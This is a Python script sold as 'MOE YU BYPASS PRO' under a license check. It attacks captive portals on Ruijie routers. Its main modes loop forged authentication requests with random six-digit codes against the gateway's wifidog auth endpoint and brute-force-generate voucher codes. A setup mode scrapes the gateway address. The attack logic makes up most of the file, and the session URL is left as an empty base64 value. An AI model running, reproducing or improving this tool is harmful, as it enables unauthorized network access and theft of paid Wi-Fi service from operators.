import os
import re
import sys
import uuid
import time
import json
import zlib
import base64
import random
import string
import hashlib
import asyncio
import aiohttp
import requests
import argparse
from datetime import datetime

# --- CONFIGURATION ---
KEY_URL = "https://raw.githubusercontent.com/hhtethtet277-svg/my-database-/refs/heads/main/key.txt"
ID_STORAGE = ".moeyu_device_id"

# Colors
w, g, y, r, b, c = "\033[1;37m", "\033[1;32m", "\033[1;33m", "\033[1;31m", "\033[1;34m", "\033[1;36m"

def get_hwid():
    """ID ကို ဖိုင်ထဲမှာ အသေသိမ်းထားပြီး ပြန်ထုတ်ပေးသည့်စနစ်"""
    if os.path.exists(ID_STORAGE):
        with open(ID_STORAGE, "r") as f:
            return f.read().strip()
    else:
        user = os.popen('whoami').read().strip()
        model = os.popen('getprop ro.product.model').read().strip()
        raw = f"{user}-{model}-{random.randint(100000, 999999)}"
        new_id = hashlib.md5(raw.encode()).hexdigest().upper()
        with open(ID_STORAGE, "w") as f:
            f.write(new_id)
        return new_id

def Logo():
    os.system("clear")
    my_id = get_hwid()
    logo = f"""{r}
 ███▄           ▄████▄   ▓█████  ██   ██  ██   ██ 
 ▓██ ▀█▄       ▒██    ▀  ▓█   ▀  ▒██  ██▒ ▒██  ██▒
 ▓██  ▀█▄      ▒██       ▒███     ▒██ ██░  ▒██ ██░
 ░██   █▌      ▒██    ▄  ▒▓█  ▄   ░ ▐██▓░  ░ ▐██▓░
 ░██████░      ▒ ████▀   ░▒████▒  ░ ██▒▓░  ░ ██▒▓░
{g}         ── {w}MOE YU BYPASS PRO {g}──{w}"""
    print(logo)
    print(f"{y}─" * os.get_terminal_size()[0])
    print(f"{g}  [👤] {w}Dev      : {y}@moeyu")
    print(f"{g}  [🆔] {w}Fixed ID : {c}{my_id}")
    print(f"{g}  [🛡️] {w}Target   : {r}Ruijie Router Only")
    print(f"{y}─" * os.get_terminal_size()[0])

def check_key():
    """GitHub Database မှ Key ကို စစ်ဆေးခြင်း"""
    my_id = get_hwid()
    Logo()
    print(f"{y}[*] Verifying Secure License...{w}")
    try:
        headers = {'User-Agent': 'Mozilla/5.0', 'Cache-Control': 'no-cache'}
        res = requests.get(f"{KEY_URL}?t={int(time.time())}", headers=headers, timeout=15)
        if res.status_code == 200:
            lines = res.text.splitlines()
            for line in lines:
                if "|" in line:
                    parts = line.strip().split("|")
                    if len(parts) >= 2:
                        db_key = parts[0].strip()
                        exp_str = parts[1].strip()
                        if db_key == my_id:
                            today = datetime.now().date()
                            expiry = datetime.strptime(exp_str, "%Y-%m-%d").date()
                            if today <= expiry:
                                print(f"{g}[+] Access Authorized! Welcome Moe Yu.{w}")
                                time.sleep(1.2)
                                return True
            print(f"{r}[!] UNREGISTERED ID!{w}")
            print(f"{y}[>] Your Fixed ID: {c}{my_id}{w}")
            sys.exit()
        else:
            print(f"{r}[!] Server Error: {res.status_code}{w}")
            sys.exit()
    except:
        print(f"{r}[!] Connection Failed!{w}")
        sys.exit()

async def get_session_id(session, session_url, prev_id):
    try:
        async with session.get(session_url, timeout=5) as req:
            return re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", str(req.url)).group(1)
    except: return prev_id

class InternetAccess:
    def __init__(self):
        self.session_url = base64.b64decode(b'').decode()
        try: self.ip = open(".ip", "r").read().strip()
        except: self.ip = "192.168.0.1"

    async def execute(self):
        Logo()
        print(f"{y}[*] Running Internet Bypass Loop...{w}")
        async with aiohttp.ClientSession() as session:
            while True:
                sid = await get_session_id(session, self.session_url, None)
                code = "".join(random.choice(string.digits) for _ in range(6))
                try:
                    async with session.post(f'http://{self.ip}:2060/wifidog/auth?', params={'token': sid, 'phoneNumber': code}) as res:
                        print(f"{w}[{datetime.now().strftime('%H:%M:%S')}] Bypass: {res.status}")
                except: pass
                await asyncio.sleep(1)

async def VoucherCode(mode, length, speed):
    """Alias 'san' အတွက် Voucher code ထုတ်ပေးသည့် Logic"""
    Logo()
    print(f"{y}[*] Generating Codes (Mode: {mode}, Speed: {speed})...{w}")
    chars = string.digits if mode == "digit" else string.ascii_letters + string.digits
    delay = 1 / speed if speed > 0 else 0.1
    while True:
        code = "".join(random.choice(chars) for _ in range(length))
        print(f"{g}[+] Generated: {w}{code}")
        await asyncio.sleep(delay)

def feature():
    parser = argparse.ArgumentParser()
    parser.add_argument("-o", "--option", choices=["internet", "setup", "code"], required=True)
    parser.add_argument("-m", "--mode", choices=["digit", "ascii"], default="digit")
    parser.add_argument("-l", "--length", type=int, default=6)
    parser.add_argument("-s", "--speed", type=int, default=100)
    args = parser.parse_args()

    if args.option == "setup":
        Logo()
        try:
            res = requests.get("http://192.168.0.1", timeout=5).url
            gw = re.search('gw_address=(.*?)&', res).group(1)
            with open(".ip", "w") as f: f.write(gw)
            print(f"{g}[+] Setup Successful!{w}")
        except: print(f"{r}[!] Setup Failed. Check WiFi connection.{w}")
    elif args.option == "internet":
        asyncio.run(InternetAccess().execute())
    elif args.option == "code":
        asyncio.run(VoucherCode(args.mode, args.length, args.speed))

if __name__ == "__main__":
    if check_key():
        try: feature()
        except KeyboardInterrupt: print(f"\n{r}[!] Tool Stopped.{w}")
